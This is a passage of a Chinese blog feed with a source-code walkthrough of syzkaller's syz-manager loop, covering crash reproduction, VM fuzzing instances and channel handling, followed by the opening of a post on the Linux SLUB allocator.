class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 尝试最小化程序集</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 首先尝试在不简化配置的情况下提取 C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 简化配置并尝试提取 C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 简化 C 相关的配置.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> 的逻辑比较简单：</p><ul><li>逆序后调用 <code>context.extractProgSingle()</code> <strong>逐个运行单个程序</strong>，若某一程序触发了 crash 则直接返回</li><li>若单一程序无法触发 crash，则调用 <code>context.extractProgBisect()</code> <strong>使用二分法找出触发 crash 的程序集合</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// 分别执行每个程序以检测由单个程序造成的简单的 crash.</span><br><span class="hljs-comment">// 程序被逆序执行, 通常最后一个程序就是罪魁祸首.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 若只有一个 entry 则不进行二分.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// 执行多个程序并二分 log 以找到造成崩溃的多个程序.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数主要就是通过如下调用链来在 VM 中执行程序，这里就不展开了：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="②-循环启动协程进行-fuzzing">② 循环启动协程进行 fuzzing</h4><p>此时已经不满足可以进行 crash 复现的条件了，因而会有第二个小循环启动新协程<strong>将资源池中剩余 VM 调度去 fuzzing</strong>， 并将结果输出到 <code>runDone</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> 函数实际上会调用 <code>runInstanceInner()</code>，该函数<strong>仅当产生了 Crash 时返回的结果才不为 nil，即 runRepro 队列实际上为 Crash 队列：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> 的核心部分主要是：</p><ul><li><p>调用 <code>vmPool.Create()</code> 创建 VM，调用 <code>inst.Forward()</code> 进行 TCP 转发，拷贝 <code>syz-fuzzer</code> 与 <code>syz-executor</code> 到 VM 文件系统中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// 若提供了 ExecutorBin , 这意味着 syz-executor 早已在镜像中,</span><br><span class="hljs-comment">// 故无需进行拷贝.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>instance.FuzzerCmd()</code> 生成命令行后调用 <code>inst.Run()</code> 启动 <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>inst.MonitorExecution()</code> 监控 VM 运行，该函数主要是<strong>通过获取 kernel oops 来判断是否触发了 crash</strong>（KASAN 不会造成 kernel panic，从而使得一个 VM 实例长期运行，不过 dmesg 中仍有 oops）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-等待处理不同-channel-数据">Step 3. 等待处理不同 channel 数据</h3><p><code>vmLoop()</code> 的最后主要就是一个大的 <code>select</code>，等待某个 channel 中有数据后进行处理，之后重新跳回等待处理或是开始下一轮循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>首先是资源池的 <code>Freed</code> channel，在 <code>Put()</code> 中会将空闲 VM idx 放回资源池后向该 channel 送入一个 <code>true</code>，而这里什么都没有做，笔者估计会在后续版本中更新：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> 其实是 <code>Manager.vmStop</code> ，这个 channel 会在 VM instance 所实现的 <code>Run()</code> 方法中被使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>当 <code>runDone</code> 中有数据时说明<strong>fuzz 产生了 crash</strong>，此时会将产生 crash 的 VM 释放回资源池，将 crash 写入 <code>pendingRepro</code> 表中等待下一轮循环进行处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> 中为 crash 的复现结果，这里会保存复现结果并将对应的 crash 从 <code>reproducing</code> 表中删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> 中有数据则表示收到了终止信号，此时会将 <code>shutdown</code> 置为 nil，终止循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> 上也可能传来 crash，此处将其送入 <code>pendingRepro</code> 表中等待在后续循环中复现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> 是一个传输 channel 的 channel，这里会将一个条件判断结果传入传来的 channel 中并重新跳回等待：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>最后是 <code>reproRequest</code>，该 channel 意为<strong>主动进行复现的请求</strong>，这里会拷贝 <code>reproducing</code> 位图后将其传入传来的 channel 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，<code>syz-manager</code> 的基本运行逻辑分析完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宁就是👴の Manager 🐎&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x04】Linux Kernel 内存管理浅析 III - Slub Allocator</title>
    <link href="http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T18:24:42.000Z</published>
    <updated>2023-02-23T18:25:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>比起大的page👴还是喜欢小的object</p><span id="more"></span><h1>0x00.一切开始之前</h1><blockquote><p>因为这系列文章🕊🕊🕊太久了，内核的内存管理也发生了一定的变化，所以本文直接用最新的 6.2 版本的内核源码：）</p></blockquote><p>在<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">上一篇文章</a> 中笔者简要介绍了 buddy system 的基本流程，但其为一个「页」这一级的 allocator，在日常生活中使用（？）难免有些浪费，因为内核中需要动态内存分配的场景虽然很多，但是我们<strong>通常并不需要使用一整页起步的内存，而往往是需要分配一些比较小的对象</strong>——因此 slab allocator 应运而生，其代替我们向 buddy system 请求内存页，并分割为多个小的 object，当我们每次需要时只需要取一个 object 即可</p><blockquote><p>slab 又被称为内核的堆（heap）内存管理，因为其与用户态的内存“堆”（heap）类似，都是动态分配的内存</p></blockquote><p>slab allocator 一共有三种版本：</p><ul><li>slab（最初的版本，机制比较复杂，效率不高）</li><li>slob（用于嵌入式等场景的极为简化版本）</li><li><strong>slub</strong>（优化后的版本，<strong>现在的通用版本</strong>）</li></ul><blockquote><p>这三种内存分配器的顶层 API 是一致的，但内部实现是不一致的（例如 slab 和 slub 各自有一个对 <code>kmem_cache</code> 的不同定义）</p></blockquote><p>本篇文章中我们主要介绍的是 <strong>slub</strong> ，也是现在内核中最为通用的小对象分配器</p><h1>0x01. slub allocator 的基本结构</h1><p>首先来一张 Overview：</p><p><img 